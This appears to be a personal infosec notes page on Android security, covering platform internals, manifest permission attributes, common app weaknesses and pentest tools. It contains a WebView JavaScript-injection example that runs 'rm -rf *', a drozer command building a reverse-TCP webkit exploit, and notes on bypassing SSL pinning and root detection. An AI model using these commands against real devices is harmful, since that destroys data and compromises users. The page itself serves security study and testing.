---
layout: page

title: Android-security

category: infosec
see_my_category_in_header: true

permalink: /infosec/android-security.html
---

<article class="markdown-body" markdown="1">

# Content

* TOC
{:toc}

---

## Bookmarks

### Awesomness

* [Best Practices for Security &amp; Privacy](https://developer.android.com/training/best-security.html) - google cheatsheet
* [Google security tips](https://developer.android.com/training/articles/security-tips.html)
* [OWASP mobile security - Top 10](https://www.owasp.org/index.php/Projects/OWASP_Mobile_Security_Project_-_Top_Ten_Mobile_Risks)

<br>

* [Anatomy of Android - internals, externals and all in between](https://anatomyofandroid.com/) - several articles

## Articles

* {:.dummy} [Spoofing and intercepting SIM commands through STK framework](http://blog.0xb.in/2015/08/spoofing-and-intercepting-sim-commands.html?view=sidebar) - (Android 5.1 and below) (CVE-2015-3843)
* {:.dummy} [Google Chrome for Android: UXSS and Credential disclosure](http://blog.0xb.in/2012/10/google-chrome-for-android-uxss-and.html)

---

<!-- ============================================================================================================================================ -->

## Mobile devices

### Mobile devices characteristics

- small
- popular - a lot of applications, a lot of users
- always online
- universal
    - used for personal purposes
    - used for work purposes

- contain a lot of valuable data (passwords from enterprise, from mail, from banks, OTP, ...)
- use wireless technologies: sim, Wifi, NFC, Bluetooth

*STK (SIM Toolkit) - is a standard of the GSM system which enables the Subscriber Identity Module (SIM) to initiate actions. SIM can write text to mobile, ask question to user, make a call, etc. It also can contain java apps (JavaCard).*

### Intruder model

- hacker can have your telephone
- hacker succesfully installed app into your telephone
- hacker is somewhere near you and can communicate only via wireless technologies

<br>

---

<!-- ============================================================================================================================================ -->

## Android system

**Android security** is based on **sandbox** concept, which is based on different UID for apps and since 4.3 uses SELinux, since 5.0 - only SELinux.
Main security mechanisms are:

- sandbox
- application framework, implementing cryptography, permissions, secure IPC, etc.
- ASLR, NX, ProPolice, safe_iop, OpenBSD dlmalloc, OpenBSD calloc, and Linux mmap_min_addr
- user-granted and application-defined permissions
- Keystore

**Android IPC** is based on **binder mechanism** that is **Android RPC**, for defining binder interface is used AIDL (Android Interface Definition Language). Everything goes through binder, it uses shared memory in kernel to optimize copying data from app to app.

Broadcasts can be consumed by a receivers. If you want reliable delivery specify the receiver.

Android uses *Bionic libc* instead of glibc. <br>
Application consists of components, system starts/stops them automatically. <br>
Applications is installed to `/data/data/app_name`; `/mnt/sdcard` - removable storage

#### Android OS structure

- kernel (+ drivers)
- userspace libraries and APIs written in C (ssl, libc, sqlite, opengl, ...)
- an application framework (activity manager, window manager, content providers, ...)
- application software running inside the application framework


#### System startup

- bootloader
- kernel
- init
- zygote (used to start applications by forking)
- system server (starts services)
- activity manager (looks after applications, monitors a lot, controls permissions, starts activities, services, etc.)
- launcher (home)

#### Toolchain

Compilation: <br>
java source code --> .jar --> .dex --> .apk <br>
Android < 5.0 java applications is interpreted by *Dalvik VM*. (however *ART* was added as alternative since 4.4) <br>
Android >= 5.0 uses *ART (Android Runtime)* instead. It compiles application during installation to native instructions to be faster. <br>
Dalvik VM was a register based instead of stack based java.

Android SDK (Software Development Kit) is environment for android develope and run (emulate devices, connect to them, etc.) <br>
To bind C functions into Java code one can use JNI (Java Native Interface) (android developers uses NDK - native development kit)

adb - android debug bridge - usb gadget driver <br>
*using APKtool, IntelliJ IDEA, android sdk and decompilation tools, you can **debug** application*

#### Keystore

Keystore is a class representing a storage facility for cryptographic keys and certificates.
Keystore manages different types of entries: KeyStore.PrivateKeyEntry, KeyStore.SecretKeyEntry, KeyStore.TrustedCertificateEntry.

<br>

---

<!-- ============================================================================================================================================ -->

## Android app structure

Application:

- Resources
- Manifest (describes application components, app and components permissions)
    
    - Intents

        - *Activities*
        - *Servicies*
        - *Broadcast Receivers* (can be created programmically)

    - Permissions
    - *Content Providers*

- Native libs
- Classes

<br>

---

<!-- ============================================================================================================================================ -->

## Manifest security points

[Manifest specification](https://developer.android.com/guide/topics/manifest/manifest-intro.html)

[API Google for android](https://developers.google.com/android/)

- (api >= 1) ```<manifest>``` `android:installLocation` - *internalOnly* or *auto* or *preferExternal*
- (api >= 1) ```<uses-sdk>``` - sets minimal, maximal and target sdk version
- (api >= 1) ```<application android:debuggable="true" ...>``` - enables to attach to process with jdb (java debugger) and gives some privileges under process (run-as, etc.).
<br>&nbsp;

- (api >= 23) ```<uses-permission-sdk-23>``` - Specifies that an app wants a particular permission, but only if the app is running on a device with API level 23 or higher.
- (api >= 1) ```<permission android:name="com.example.project.DEBIT_ACCT" ... />``` - declaring the permission to get access to app

    - `android:protectionLevel`

        - `normal` - a lower-risk permission that gives requesting applications access to isolated application-level features
        - `dangerous` - a higher-risk permission that would give a requesting application access to private user data or control over the device that can negatively impact the user.
        - `signature` - a permission that the system grants only if the requesting application is signed with the same certificate as the application that declared the permission.
        - `signatureOrSystem` - a permission that the system grants only to applications that are in the Android system image or that are signed with the same certificate as the application that declared the permission.

- (api >= 1) ```<uses-permission android:name="android.permission.READ_CONTACTS" />``` - the tag requesting the permission

- (api >= 4) ```<uses-feature>``` - declares types of hardware features smartphone must have (if `android:required="true"`) and better to have (if `android:required="false"`) (e.g. android.hardware.bluetooth)

- (api >= 3) ```<uses-configuration>``` - indicates if it needs some types of hardware and software features.
<br>&nbsp;


- (api >= 1) ```<service>``` - declares a service (a Service subclass) as one of the application's components. <br>
    (api >= 1) ```<receiver>``` - broadcast receiver of intents from system and other apps. <br>
    (api >= 1) ```<activity>``` - declares an activity (an Activity subclass) that implements part of the application's visual user interface.

    - `android:enabled` - be default is **true** - the service/receiver can be instantiated by the system

    - `android:exported` - indicates if the service is exposed to other apps<br>
        *service / activity* - by default is **not exposed**, but after *adding any intent filters* - by default is **exposed**.<br>
        *receiver* - by default is **exposed**.

    - `android:isolatedProcess` (only for service and receiver) - indicates that service will run under a special process that is isolated from the rest of the system and *has no permissions of its own*.

    - `android:permission` - specifies the permission caller/sender must have. <br>
        If permission is not set, application's `<permission>` element will be used. If neither are set - the service is **not protected**.

    - `android:process` - if starts with a `:`, a new process, private to the application, is created for service. If the process name begins with `a lowercase character`, the service will run in a global process of that name, provided that it has permission to do so. (allows different apps to share process, reducing resource usage)


    ```<activity-alias>``` has attributes `enabled`, `exported` and `permission`.
    <br>&nbsp;


- ```<protected-broadcast android:name="...">``` - tells android os to allow this application get broadcast messages only from system.
<br>&nbsp;

- (api >= 1) ```<intent-filter>``` - specifies the types of intents that an activity, service, or broadcast receiver can respond to. <br>
    
    - `android-priority` - when an intent could be handled by multiple activities with different priorities <br>
        for intent - android will consider only those with higher priority values as potential targets <br>
        for broadcast receivers - priority controls the order in which broadcast receivers are executed to receive broadcast messages

- (api >= 1) ```<provider>``` - supplies structured access to data managed by the application.

    - `android:enabled` - be default is `true` - the provider can be instantiated by the system
    - `android:exported` - indicates if the service is exposed to other apps<br>
        if `android:minSdkVersion` or `android:targetSdkVersion` <= 16 by default provider is **exposed**, if >=17 - **not exposed**

    - `android:multiprocess` - by default is *false*, meaning instance of the content provider will **not** be created in every client process
    - `android:permission`, `android:readPermission`, `android:writePermission` - the name of a permission that clients must have to read/write the content provider's data (last two takes precedence over the first one)
    - `android:syncable` - whether or not the data under the content provider's control is to be synchronized with data on a server — "true" if it is to be synchronized, and "false" if not.
    <br>&nbsp;

    - `android:grantUriPermissions` - if "true", permission can be granted to any of the content provider's data <br>
        if `false`, enables access to resources described in ```<grant-uri-permission>```
    
        Permission to access using grantUriPermissions is granted by `FLAG_GRANT_READ_URI_PERMISSION` and `FLAG_GRANT_WRITE_URI_PERMISSION` flags in the Intent object that activates the component.

        - (api >= 1) ```<grant-uri-permission>``` - if `android:grantUriPermissions` is false, permission can be granted only to data subsets that are specified by this tag element.

    - (api >= 4) ```<path-permission>``` - defines the path and required permissions for a specific subset of data within a content provider.

        - `android:permission`, `android:readPermission`, `android:writePermission` - the name of a permission that clients must have to read/write the content provider's data (last two takes precedence over the first one)

<br>

---

<!-- ============================================================================================================================================ -->

## Vulnerable android app points

- **filesystem** rights:

    - on **telephone card**: default is **`MODE_PRIVATE`** - chmod 0660 - nobody can read your files
    - on **sd card**:  default chmod **0755** - everybody can read your files

    - system tools for files (and not only) (e.g. touch, echo) can create them with unsecure rights (0666). **Use only** android **API**.


- secure **network** connections

    - analyse traffic

        - several frameworks for "comfort" can approve any self-signed cert, or developer can forget to check for matching sertificate domain to server domain, etc.

        - use signed certificates (signed with CA, not expired, not recalled, with correct domain names)

            can be bypassed for reverse engineering, by adding your own root CA

        - use pinned certificates (checking if certificate from server matches sertificate stored in application (hardcoded in code or in its resources))

            - defends from CA certificate being compromised, or from adding hackers certificate to the list of trusted certificates <br>

            - demand application update for certificate update
            - hard (but possible) to bypass for reverse engineering *(SSLunpinning, android-ssl-bypass, Android-SSL-TrustKiller)*

            *In android version 4.4 SSLunpinning works good*

        - *all* trafic must be encrypted, *NO* exclusions (such as advertisments, news, social network, telemetry, etc.)

    - analyse server side
    - analyse client side


- **IPC** - Interprocess communication

    - **Content providers** (allow to call functionality of application (sometimes functionality can be critical))

        android < 4.1 - always exported
        android > 4.1 - exported on developer instructions

        <br>

        content provider's filters (conditions that must be fulfilled to have right to call content provider):

        - application signature must be from the same developer
        - by application name
        - ask user (of course users always tap *yes*)

        When accessing a content provider, use parameterized query methods such as query(), update(), and delete() to avoid potential SQL injection from untrusted sources.


- Android **Intents**

    - **broadcast** - broadcast messages handler

        android < 6.0 - any application can send a broadcast message

    - intent data must be validated


- After getting a broadcast intent you must to make sure, from whom you got it.

    Before sending  broadcast intent you must be sure, that target component was not replace by malicious content. <br>

    The commands which require user intercation are placed in a queue (e.g. question from sim card). So after getting answer from user through broadcast intent you must be confident whose question user answered your or the malicious hackers answer just before your which send the same broadcast intent, e.g. [sim spoofing](http://blog.0xb.in/2015/08/spoofing-and-intercepting-sim-commands.html)


- **Task activity hijacking** ([paper](https://www.usenix.org/system/files/conference/usenixsecurity15/sec15-paper-ren-chuangang.pdf))

    If user already installed malicious software, it can temper with taskAffinity to redirect user from good application to malicious one (purposes: fishing, ransomware, spyware, ...).

    Exists several attacking scenario's, all are based on specifying `taskAffinity` to change current task and return to other activities in malicious tasks, some methods can additionaly use `allowTaskReparenting=true`, `launchMode=singleTask` and `FLAG_ACTIVITY_(NEW_TASK|SINGLE_TOP|CLEAR_TOP|REORDER_TO_FRONT|NO_HISTORY|CLEAR_TASK|NEW_DOCUMENT|MULTIPLE_TASK)`

    - no real mitigation way


- application **android:debuggable** - enables to attach to process with jdb (java debugger) and gives some privileges under process (run-as, etc.).
<br>&nbsp;


- **eval** equivalents in Android

    - **webview** javascript execution

        requirements:

        - setJavaScriptEnabled();
        - addJavaScriptInterface();
        
        if we can inject into javascript our code we have RCE, e.g.

        `JavaObject.getClass().forname(“java.lang.Runtime”).getMethod(“getRuntime”, , null).invoke(null,null).exec([“/system/bin/sh”,”rm”,”-rf”,”*”])`


Information leaks:

- **logcat** - developers could have not disabled logging - handy for app analysis

    (android < 4.1 (api 16)) - logcat can be read by any application (after api 16 each application has its own log)

- application WebView (can store sensitive data just like web browser)

Information leaks for application analysis:

- application can store sensitive information in **sqlite db** (credentials, ip-addresses, etc) <br>
    possible sql injections
- application cache

<br>

Application can check if google play services installed on smartphone is up-to-date and even automatically update them. (e.g. [checking provider](https://developer.android.com/training/articles/security-gms-provider.html))

<br>

---

<!-- ============================================================================================================================================ -->

## Wireless attacks

- fake cellphone stations ([GSM security]({{ "/infosec/gsm.html" | prepend: site.baseurl }}))
- fake wifi hotspots ([Wifi security]({{ "/infosec/wifi.html" | prepend: site.baseurl }}))
    
    - if wifi is on, telephone always tries to connect to known hotspots

- NFC
- Bluetooth (headset)

SMS is **not encrypted** and **not authenticated** and can be intercepted, therefore is absolutely not secure (nor their content, nor sender).

<br>

---

<!-- ============================================================================================================================================ -->

## Android app defences

- root detection

    Runtime checks:

    - Standart files and configurations:

        *build* tag: `cat /system/build.prop | grep ro.build.tags`, must be equal to `release-keys`

        Over The Air (OTA) certificates (google certs for updates): `ls -l /etc/security/otacerts.zip`

    - Search for additional components on smartphone:

        right managers: superuser.apk, com.thirdparty.superuser, eu.chainfire.supersu, com.koushikdutta.superuser, com.zachspong.temprootremovejb, com.ramdroid.appquarantine

        busybox

    - Check output for `user`, `id`

    - Check filesystem writes:

        `/data` becomes readable

        a lot of directores in `/` become writable

    Bypass for analysis:

    - RootCloak (uses method hooking (exec, file i/o, getInstalledApplications, etc.)) (Xposed framework needed)

- ssl-pinning

    procedure of storing ssl certificate of app's server inside application to make additional checks defending from MITM

    Bypass for analysis:

    - SSLunpinning (Xposed framework module), android-ssl-bypass, Android-SSL-TrustKiller (needs root, uses method hooking)

<br>

---

<!-- ============================================================================================================================================ -->

## Android security tools

[Android Tamer](https://androidtamer.com/) - distributive for android security penetration testing
<br> [Koodous](https://docs.koodous.com/) - platform for Android malware research (looks like infosec ecosystem)

* [Xposed framework (4PDA)](http://4pda.ru/forum/index.php?showtopic=425052) - hooking framework
* [Frida](http://www.frida.re/) - framework for javascript injections (not only android related)

<br>

* [debugging APK](http://www.securitylab.ru/analytics/472624.php?R=1) (article) (русский) - decompilation and debugging of APK
* [ProGuard](https://www.guardsquare.com/en/proguard) - most pupular optimizer (thus *obfuscator*) for java bytecode

<br>

* [MobSF](https://github.com/MobSF/Mobile-Security-Framework-MobSF) - Mobile Security Framework - an intelligent, all-in-one open source mobile application (Android/iOS/Windows) automated pen-testing framework capable of performing static, dynamic analysis and web API testing

*   [drozer](https://github.com/mwrlabs/drozer) - ***awesome*** security testing framework for Android

    Connecting:

    ```
    # 1. Generate agent application apk
    $ drozer agent build
    # 2. Launch an agent application on android device
    # 3. Forward ports from avd to host
    ./adb forward tcp:31415 tcp:31415
    # 4. run drozer (e.g. console mode)
    drozer console --server localhost:31415 connect
    ```

    General commands:

    ```
    dz> list # show all modules
    dz> run app.package.list # list all packages
    dz> run app.package.list -f test # grep list of packages
    dz> shell # run shell
    ```

    First priority commands for application analysis:

    ```
    dz> run app.package.info -a test.app.sdk
    dz> run app.package.attacksurface test.app.sdk
    dz> run app.package.launchintent test.app.sdk
    dz> run app.provider.info -a test.app.sdk
    dz> run app.activity.info -a test.app.sdk
    dz> run app.service.info -a test.app.sdk
    dz> run app.broadcast.info -a test.app.sdk
    ```

    `Permission: null` - means no permissions needed to start activity/service/broadcast

    Shellcode examples ([trivial example](http://mobiletools.mwrinfosecurity.com/Exploitation-features-in-drozer/)):

    ```
    $ drozer exploit list
    $ drozer shellcode list
    $ drozer exploit build exploit.remote.webkit.nanparse –-payload weasel.reverse_tcp.armeabi --server 10.0.2.2:31415 --push-server 127.0.0.1:31415 --resource /home.html
    ```

* [qark](https://github.com/linkedin/qark) - ***awesome*** tool designed to look for several security related Android application vulnerabilities

Triggering intents ([`./adb shell am -h`](https://gist.github.com/tsohr/5711945)):

* `./adb shell am start -a android.intent.action.VIEW -c android.intent.category.DEFAULT -e foo bar -e bert ernie -n my.package.component.blah` <br>
    (in Java code extraction: `extras.getString("foo")`)
* `./adb shell am start -n com.package.name/com.package.name.ActivityName` or `am start -a com.example.ACTION_NAME -n com.package.name/com.package.name.ActivityName`
* `./adb shell am broadcast -a android.intent.action.BOOT_COMPLETED -c android.intent.category.HOME -n net.fstab.checkit_android/.StartupReceiver`

#### Android Emulators:

* [Android studio + Android SDK](https://developer.android.com/studio/index.html#downloads) (avd will be ***not*** rooted)
* [Android x86 VM images for VMware and VirtualBox](http://www.osboxes.org/android-x86/)
* [Genymotion](https://www.genymotion.com/) (avd ***will be*** rooted from the box)
* Other emulators: [memu](http://www.memuplay.com/)

Enable proxy for emulators:

* settings -> wireless & networks -> More -> Cellular networks -> Access Point Names -> T-Mobile US -> `<change proxy:port>` -> upper right corner -> Save <br>
    However this method sometimes doesn't work
* `emulator -avd myavd -http-proxy http://168.192.1.2:3300`

#### Download APK:

* [Raccoon](https://github.com/onyxbits/Raccoon) - Google Play desktop client (allows to download android APK files) (look into `~/Documents/Racoon`)
* [APK online downloader](https://apkpure.com/)

#### APK disassemble

* unzip -> dex2jar
* APK Studio
* Apktool

<br>

* `aapt.exe` (`…\adt-bundle\sdk\build-tools\android-4.4W\`) – extract lots of information about .apk

#### Java decompilers

* [jd-gui](https://github.com/java-decompiler/jd-gui/releases)
* [cfr](http://www.benf.org/other/cfr/)
* [jad](http://www.javadecompilers.com/jad)
* [dex2jar](https://github.com/pxb1988/dex2jar/releases) - dex->jar
* [jadx](https://github.com/skylot/jadx) - dex->java
* [BytecodeViewer](https://github.com/Konloch/bytecode-viewer) - combined utility (has various backends)
* [procyon](https://bitbucket.org/mstrobel/procyon/wiki/Java%20Decompiler)
* [Luyten](https://github.com/deathmarine/Luyten)
* [fernflower](https://github.com/fesh0r/fernflower)
* [Krakatau](https://github.com/Storyyeller/Krakatau/) (python required)

#### Other tools:

* [apk deguard](http://apk-deguard.com/) - statistical deobfuscation for android

<br>

* [Nocturne](https://github.com/LapisBlue/Nocturne) - a graphical tool for creation of Java deobfuscation mappings
* [Android-SSL-TrustKiller](https://github.com/iSECPartners/Android-SSL-TrustKiller) - bypass SSL certificate pinning for most applications
* [Dexprotector](https://dexprotector.com/) – android-app obfuscator

<br>

* [ApkAnalyser](https://github.com/sonyxperiadev/ApkAnalyser/downloads) - static, virtual analysis tool

<br>

* {:.dummy} list of other tools: [25 Awesome Android Reverse Engineering Tools - Mobile phones - Romanian Security Team](https://rstforums.com/forum/topic/102731-25-awesome-android-reverse-engineering-tools/)
* {:.dummy} [ip-tools](https://4pda.ru/forum/index.php?showtopic=478753) - android-application for network analysis
* {:.dummy} [Termux](https://play.google.com/store/apps/details?id=com.termux&hl=ru) - powerful terminal emulation with an extensive Linux package collection.

---

<div class="spoiler"><div class="spoiler-title">
    <i>Crib - connecting to remote android emulator</i>
</div><div class="spoiler-text" markdown="1">

*Follow this instructions **precisely** !!!*

* on *host* machine with ip = `$REMOTE_IP` we start android emulator (port 5554)
* we are connecting from some *guest* machine

1. Make port forwarding on *guest*: `localhost:5554 -> $REMOTE_IP:5554` **and** `localhost:5555 -> $REMOTE_IP:5555` (because adb server will connect to `localhost`)
1. Make port forwarding on *host*: `$REMOTE_IP:5554 -> 127.0.0.1:5554` **and** `$REMOTE_IP:5555 -> 127.0.0.1:5555` (because emulator listen `localhost:5554` but not `0.0.0.0:5554`)
1. `./adb kill-server` on *host* machine ( -- not sure if this step is needed)
1. Restart your avd device on *host* machine ( -- not sure if this step is needed)
1. `./adb kill-server && ./adb connect $REMOTE_IP:5554 && ./adb devices` on *guest* machine

    You must see available devices now. (also you can use instead of `$REMOTE_IP` `localhost` in `connect` command (because port forwarding works))

</div>
</div>

<br>

<div class="spoiler"><div class="spoiler-title">
    <i>Crib</i>
</div><div class="spoiler-text" markdown="1">

>   - cd android-sdk/tools
>   - .\android.bat list avd
>   - .\emulator.exe -avd nexus-5x-api24-google-api -http-proxy http://192.168.1.98:8080
>   - cd android-sdk/platform-tools
>   - .\adb.exe devices -l
>   - .\adb -s 192.168.80.101:5555 shell
>
>   - adb shell dumpsys user
>   - adb shell pm list users
>   - adb shell am start -n com.example.nanisenya.snatch/.MoneyTransferActivity --es id 31 --es amount 1 --es receiver 80107430600227300031 --es description wow
> <br>&nbsp;
> 
>  Rebuilding android apk
>
>   - Generate key 
>   
>       `keytool -genkey -v -keystore my_key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000`
>
>   - Sign android apk
>
>       `jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my_key.keystore app_name.apk alias_name`
>
>   - Add into keystore specified certificate
>       
>       `keytool -importcert -v -trustcacerts -file "cert.der" -keystore "keystore.bks" -provider org.MyProvider -providerpath "my_app.jar" -storetype BKS -storepass testing`

</div>
</div>

</article>
